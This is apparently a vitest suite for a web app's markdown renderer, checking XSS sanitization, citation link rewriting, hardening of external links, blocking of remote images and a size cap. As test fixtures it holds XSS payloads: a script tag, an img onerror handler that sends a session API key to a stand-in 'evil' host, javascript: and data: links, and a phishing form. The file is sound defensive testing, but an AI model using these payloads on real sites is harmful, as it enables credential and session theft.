// @vitest-environment jsdom
//
// Suite for the shared markdown pipeline (design 06 §5 C5 + design
// 04-workflow-ui §4.4/§5.1, wave U01). Content is hostile input (blocks quoted
// by the model, forge-synced issue text); renderMarkdown must neutralize it,
// keep ctx: citation links working through to /graph?focus=, harden ONLY
// foreign-origin links, and never load remote images. The jsdom environment
// gives DOMPurify a window.
//
// The assertions inspect the rendered DOM, not the HTML string: an escaped
// "javascript:" sitting as TEXT in a code span is harmless (markdown-it renders
// an invalid link as plain text), so string-absence would be both wrong and
// brittle. What must be absent is an EXECUTABLE sink — a <script> element, an
// on* handler, an <a> whose href is a javascript: URL.
//
// Gate self-check (§7-U01 "erst rot"): the raw-HTML vectors below are proven
// discriminating by rendering the SAME input through an html:true markdown-it
// variant — the unsafe variant produces the element the real pipeline must
// not. If someone flips html:false in markdown.ts, the negativ suite goes red.

import { describe, expect, it } from 'vitest'
import MarkdownIt from 'markdown-it'
import { MARKDOWN_SOURCE_CAP, renderMarkdown } from './markdown'

function parse(html: string): HTMLElement {
  const div = document.createElement('div')
  div.innerHTML = html
  return div
}

function hasEventHandler(root: HTMLElement): boolean {
  return [...root.querySelectorAll('*')].some((el) =>
    [...el.attributes].some((a) => a.name.toLowerCase().startsWith('on')),
  )
}

describe('renderMarkdown — XSS neutralization', () => {
  it('emits no <script> element from a quoted block', () => {
    const out = renderMarkdown('Here is a block: <script>alert(1)</script> end')
    expect(parse(out).querySelector('script')).toBeNull()
  })

  it('strips on* event handlers (the <img onerror> exfil vector)', () => {
    const out = renderMarkdown('<img src=x onerror="fetch(`https://evil/?k=`+sessionStorage.ctx_api_key)">')
    expect(hasEventHandler(parse(out))).toBe(false)
  })

  it('emits no <a> with a javascript: href', () => {
    const out = renderMarkdown('[click me](javascript:alert(document.cookie))')
    const links = [...parse(out).querySelectorAll('a')]
    expect(links.every((a) => !(a.getAttribute('href') ?? '').toLowerCase().startsWith('javascript:'))).toBe(true)
  })

  it('emits no <a> with a data: href (data-URI phishing/exfil vector)', () => {
    const out = renderMarkdown('[click me](data:text/html,<script>alert(1)</script>)')
    const links = [...parse(out).querySelectorAll('a')]
    expect(links.every((a) => !(a.getAttribute('href') ?? '').toLowerCase().startsWith('data:'))).toBe(true)
  })

  it('neutralizes raw HTML embedded in the message (html:false escapes it)', () => {
    const out = renderMarkdown('The block said: <a href="javascript:steal()">x</a> and more')
    // html:false escapes the raw <a>, so it is text — no anchor element at all.
    expect(parse(out).querySelector('a')).toBeNull()
    expect(hasEventHandler(parse(out))).toBe(false)
  })

  it('escapes raw same-origin <img> HTML (element only via markdown syntax)', () => {
    // Same-origin src would pass both CSP and the foreign-origin hook — only
    // html:false prevents the raw tag from becoming an element. This is the
    // vector that turns red if the pipeline ever flips to html:true.
    const out = renderMarkdown('look: <img src="/logo.png"> here')
    expect(parse(out).querySelector('img')).toBeNull()
  })

  it('escapes raw form/input HTML (credential-phishing surface)', () => {
    const out = renderMarkdown('<form action="https://evil.example/steal"><input name="password"></form>')
    const root = parse(out)
    expect(root.querySelector('form')).toBeNull()
    expect(root.querySelector('input')).toBeNull()
  })

  it('GATE SELF-CHECK: the raw-HTML vectors DO produce elements under an html:true variant', () => {
    // Proof that this suite discriminates (§7-U01 "erst rot"): the same inputs
    // rendered through markdown-it with html:true (even before any sanitizer
    // strips scripts) yield the very elements the assertions above forbid.
    const unsafe = new MarkdownIt({ html: true, linkify: true, breaks: true })
    expect(parse(unsafe.render('look: <img src="/logo.png"> here')).querySelector('img')).not.toBeNull()
    expect(
      parse(unsafe.render('The block said: <a href="javascript:steal()">x</a> and more')).querySelector('a'),
    ).not.toBeNull()
    expect(
      parse(unsafe.render('<form action="https://evil.example/steal"><input name="password"></form>')).querySelector(
        'input',
      ),
    ).not.toBeNull()
  })
})

describe('renderMarkdown — ctx: citation survival', () => {
  it('rewrites a ctx:<id> citation to a /graph?focus= anchor', () => {
    const out = renderMarkdown('See [W49c verdict](ctx:019e789c-1381-7735-bd37-c3d0371b15d8) for details.')
    const a = parse(out).querySelector('a')
    expect(a).not.toBeNull()
    expect(a?.getAttribute('href')).toBe('/graph?focus=019e789c-1381-7735-bd37-c3d0371b15d8')
    expect(a?.textContent).toBe('W49c verdict')
  })

  it('renders ordinary markdown (bold, code, list) intact', () => {
    const root = parse(renderMarkdown('**bold** and `code` and a list:\n- one\n- two'))
    expect(root.querySelector('strong')?.textContent).toBe('bold')
    expect(root.querySelector('code')?.textContent).toBe('code')
    expect([...root.querySelectorAll('li')].map((li) => li.textContent)).toEqual(['one', 'two'])
  })

  it('returns an empty string for empty / non-string input', () => {
    expect(renderMarkdown('')).toBe('')
    // @ts-expect-error — defensive: the runtime guards a non-string
    expect(renderMarkdown(null)).toBe('')
  })
})

describe('renderMarkdown — foreign-origin link hardening (§4.4.1)', () => {
  it('adds target=_blank rel="noopener noreferrer nofollow" to a foreign https link', () => {
    const a = parse(renderMarkdown('[ext](https://example.com/page)')).querySelector('a')
    expect(a).not.toBeNull()
    expect(a?.getAttribute('target')).toBe('_blank')
    expect(a?.getAttribute('rel')).toBe('noopener noreferrer nofollow')
  })

  it('hardens plain-http and linkified bare URLs the same way', () => {
    const http = parse(renderMarkdown('[ext](http://example.com/x)')).querySelector('a')
    expect(http?.getAttribute('target')).toBe('_blank')
    expect(http?.getAttribute('rel')).toBe('noopener noreferrer nofollow')

    const bare = parse(renderMarkdown('see https://example.com/auto')).querySelector('a')
    expect(bare).not.toBeNull()
    expect(bare?.getAttribute('target')).toBe('_blank')
    expect(bare?.getAttribute('rel')).toBe('noopener noreferrer nofollow')
  })

  it('ctx: citation (/graph?focus=) carries NO target — stays an in-tab SPA link', () => {
    // The regression the blanket-hook variant causes: a citation forced into a
    // new tab is a full reload, chat context gone (§4.4.1).
    const a = parse(renderMarkdown('See [block](ctx:019e789c-1381-7735-bd37-c3d0371b15d8).')).querySelector('a')
    expect(a).not.toBeNull()
    expect(a?.getAttribute('href')).toBe('/graph?focus=019e789c-1381-7735-bd37-c3d0371b15d8')
    expect(a?.getAttribute('target')).toBeNull()
    expect(a?.getAttribute('rel')).toBeNull()
  })

  it('relative and same-origin absolute links carry NO target', () => {
    const rel = parse(renderMarkdown('[docs](/docs/setup)')).querySelector('a')
    expect(rel).not.toBeNull()
    expect(rel?.getAttribute('target')).toBeNull()

    const sameOrigin = parse(renderMarkdown(`[home](${location.origin}/graph)`)).querySelector('a')
    expect(sameOrigin).not.toBeNull()
    expect(sameOrigin?.getAttribute('target')).toBeNull()
  })

  it('treats protocol-relative //host URLs as foreign', () => {
    const a = parse(renderMarkdown('[pr](//evil.example/x)')).querySelector('a')
    expect(a).not.toBeNull()
    expect(a?.getAttribute('target')).toBe('_blank')
    expect(a?.getAttribute('rel')).toBe('noopener noreferrer nofollow')
  })
})

describe('renderMarkdown — remote-image placeholder (§4.4.3, E04-9)', () => {
  it('replaces a foreign-origin image with a text placeholder carrying the URL', () => {
    const root = parse(renderMarkdown('![screenshot](https://evil.example/pixel.png)'))
    expect(root.querySelector('img')).toBeNull()
    const ph = root.querySelector('.md-img-blocked')
    expect(ph).not.toBeNull()
    expect(ph?.textContent).toContain('external image blocked')
    expect(ph?.textContent).toContain('https://evil.example/pixel.png')
    // Text only — the URL must not become a loadable/clickable child.
    expect(ph?.children.length).toBe(0)
  })

  it("keeps same-origin and data:image images (CSP img-src 'self' data: allows them)", () => {
    const local = parse(renderMarkdown('![local](/assets/logo.png)')).querySelector('img')
    expect(local).not.toBeNull()
    expect(local?.getAttribute('src')).toBe('/assets/logo.png')

    const dataUri = parse(
      renderMarkdown('![dot](data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==)'),
    ).querySelector('img')
    expect(dataUri).not.toBeNull()
  })
})

describe('renderMarkdown — 256 KB source cap (§4.4.2)', () => {
  it('truncates oversized sources and appends the visible notice', () => {
    const marker = 'NEEDLE_BEYOND_CAP'
    const src = 'a'.repeat(MARKDOWN_SOURCE_CAP) + marker
    const out = renderMarkdown(src)
    const root = parse(out)
    expect(out).not.toContain(marker)
    const notice = root.querySelector('.md-truncated')
    expect(notice).not.toBeNull()
    expect(notice?.getAttribute('role')).toBe('note')
  })

  it('renders sources at exactly the cap without a notice', () => {
    const out = renderMarkdown('b'.repeat(MARKDOWN_SOURCE_CAP))
    expect(parse(out).querySelector('.md-truncated')).toBeNull()
  })
})
